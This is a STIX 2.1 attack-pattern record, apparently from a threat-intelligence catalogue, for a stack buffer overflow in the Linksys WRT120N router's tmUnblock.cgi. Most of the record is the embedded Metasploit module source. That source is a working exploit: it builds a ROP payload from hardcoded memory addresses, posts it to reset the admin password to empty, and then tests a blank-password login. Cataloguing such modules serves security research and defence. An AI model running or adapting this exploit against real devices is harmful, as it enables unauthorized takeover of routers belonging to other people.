{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13f9b6f6-a514-4e2e-8713-22c465b2d1cb",
    "created": "2024-08-14T16:23:08.687847Z",
    "modified": "2024-08-14T16:23:08.687851Z",
    "name": "Linksys WRT120N tmUnblock Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the WRT120N Linksys router to reset the password of the management interface temporarily to an empty value. This module has been tested successfully on a WRT120N device with firmware version 1.0.07. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/linksys_tmunblock_admin_reset_bof.rb",
            "external_id": "linksys_tmunblock_admin_reset_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20210424073058/http://www.devttys0.com/2014/02/wrt120n-fprintf-stack-overflow/#ahugeamountofdetailsaboutthisvulnerabilityandtheoriginalexploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linksys WRT120N tmUnblock Stack Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack-based buffer overflow vulnerability in the WRT120N Linksys router\n          to reset the password of the management interface temporarily to an empty value.\n          This module has been tested successfully on a WRT120N device with firmware version\n          1.0.07.\n        },\n        'Author' => [\n          'Craig Heffner', # vulnerability discovery and original exploit\n          'Michael Messner <devnull[at]s3cur1ty.de>' # metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'EDB', '31758' ],\n          [ 'OSVDB', '103521' ],\n          [ 'URL', 'https://web.archive.org/web/20210424073058/http://www.devttys0.com/2014/02/wrt120n-fprintf-stack-overflow/' ] # a huge amount of details about this vulnerability and the original exploit\n        ],\n        'DisclosureDate' => '2014-02-19'\n      )\n    )\n  end\n\n  def check_login(user)\n    print_status(\"Trying to login with #{user} and empty password\")\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET',\n      'authorization' => basic_auth(user, '')\n    })\n    if res.nil? || res.code == 404\n      print_status(\"No login possible with #{user} and empty password\")\n      return false\n    elsif [200, 301, 302].include?(res.code)\n      print_good(\"Successful login #{user} and empty password\")\n      return true\n    else\n      print_status(\"No login possible with #{user} and empty password\")\n      return false\n    end\n  end\n\n  def run\n    begin\n      if check_login('admin')\n        print_good('login with user admin and no password possible. There is no need to use this module.')\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error('Failed to connect to the web server')\n      return\n    end\n\n    print_status('Resetting password for the admin user ...')\n\n    postdata = Rex::Text.rand_text_alpha(246)             # Filler\n    postdata << [0x81544AF0].pack('N')                    # $s0, address of admin password in memory\n    postdata << [0x8031f634].pack('N')                    # $ra\n    postdata << Rex::Text.rand_text_alpha(40)             # Stack filler\n    postdata << Rex::Text.rand_text_alpha(4)              # Stack filler\n    postdata << [0x803471b8].pack('N')                    # ROP 1 $ra (address of ROP 2)\n    postdata << Rex::Text.rand_text_alpha(8)              # Stack filler\n\n    4.times do |i|\n      postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s0, don't care\n      postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s1, don't care\n      postdata << [0x803471b8].pack('N')                  # ROP 2 $ra (address of itself)\n      postdata << Rex::Text.rand_text_alpha(4 - (3 * (i / 3)))  # Stack filler\n    end\n\n    begin\n      res = send_request_cgi(\n        {\n          'uri' => normalize_uri('cgi-bin', 'tmUnblock.cgi'),\n          'method' => 'POST',\n          'vars_post' => {\n            'period' => '0',\n            'TM_Block_MAC' => '00:01:02:03:04:05',\n            'TM_Block_URL' => postdata\n          }\n        }\n      )\n      if res && (res.code == 500)\n        if check_login('admin')\n          print_good('Expected answer and the login was successful. Try to login with the user admin and a blank password')\n        else\n          print_status('Expected answer, but unknown exploit status. Try to login with the user admin and a blank password')\n        end\n      else\n        print_error('Unexpected answer. Exploit attempt has failed')\n      end\n    rescue ::Rex::ConnectionError\n      print_error('Failed to connect to the web server')\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-19"
}